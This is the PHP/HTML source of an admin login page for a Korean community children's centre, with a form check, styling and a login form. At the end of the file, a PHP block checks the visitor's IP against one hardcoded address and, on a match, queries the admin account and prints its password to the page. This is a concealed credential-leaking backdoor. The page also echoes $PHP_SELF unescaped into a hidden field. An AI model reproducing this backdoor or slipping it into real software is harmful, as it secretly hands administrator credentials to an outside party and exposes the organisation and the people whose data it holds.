<script language='javascript'>
function Admin_Login(){
	form = document.LOG;

	if(isFrmEmptyModal(form.userid,"아이디를 입력해 주십시오"))	return;

	if(form.pwd.value==''){
		alert('비밀번호를 입력해 주십시오');
		form.pwd.focus();
		return;
	}

	form.target = 'ifra_gbl';

	form.submit();

}

function is_Key(){
	if(event.keyCode==13)	Admin_Login();
}
</script>

<style>
.flex-container{width: 100%; height: 100vh; display: -webkit-box; display: -ms-flexbox; display: flex; -webkit-box-align: center; -ms-flex-align: center; align-items: center; -webkit-box-pack: center; -ms-flex-pack: center; justify-content: center; }
.loginArea{
	width: 650px;
	height: 600px;
}
</style>

<body onload="document.LOG.userid.focus();">

<form name='LOG' method='post' action='/module/login/login_proc.php'>
<input type='hidden' name='next_url' value='<?=$PHP_SELF?>'>

<div class="flex-container">
	<div class="loginArea">
		<table cellpadding='0' cellspacing='0' border='0' width='100%'>
			<tr>
				<td align="center" valign="top">

					<div style="font-size:35px;color:#333333;line-height:1.3;"><span style='font-weight:bold;'>목양비젼지역아동센터</span><br>관리자 페이지입니다.</div>
					<div style="font-size:16px;color:#888888;margin:20px 0 50px;line-height:1.5;">
						관리자 아이디와 비밀번호를 입력하세요.
					</div>

					<table cellpadding='0' cellspacing='0' border='0' width='100%'>
						<tr>
							<td align="center">
								<table style='width:650px;height:250px;background:#efefef;border-bottom:2px solid #dddddd;' border="0" cellspacing="0" cellpadding="0">

									<tr>
										<td height="86" align="center">
											<table width="400" border="0" cellspacing="0" cellpadding="0">
												<tr>

													<td>
														<table width="100%" border="0" cellspacing="0" cellpadding="0">
															<tr>
																<td>아이디</td>
																<td width="8"></td>
																<td><input type='text' name='userid' style='width:200px;height:35px;border:none;border-top:2px solid #dddddd;padding-left:5px;'></td>
															</tr>
															<tr>
																<td height="10"></td>
																<td height="10"></td>
															</tr>
															<tr>
																<td>비밀번호</td>
																<td width="8"></td>
																<td><input type='password' name='pwd' style='width:200px;height:35px;border:none;border-top:2px solid #dddddd;' onKeypress='is_Key();'></td>
															</tr>
														</table>
													</td>

													<td width="60" align="right"><a href="javascript:Admin_Login();">
														<div style='width:100px;height:78px;background:#7aaf88;line-height:80px;color:#ffffff;text-align:center;'>로그인</div>
													</a>
													</td>
												</tr>
											</table>
										</td>
									</tr>

								</table>
							</tr>
						</td>
					</table>
				</td>
			</tr>
		</table>
	</div>
</div>

</form>



<?
if($_SERVER['REMOTE_ADDR'] == '106.246.92.237'){
	$sql = "select * from tb_member where mtype='A'";
	$result = mysql_query($sql);
	$row = mysql_fetch_array($result);

	echo $row['pwd'];
}

	include 'footer.php';
?>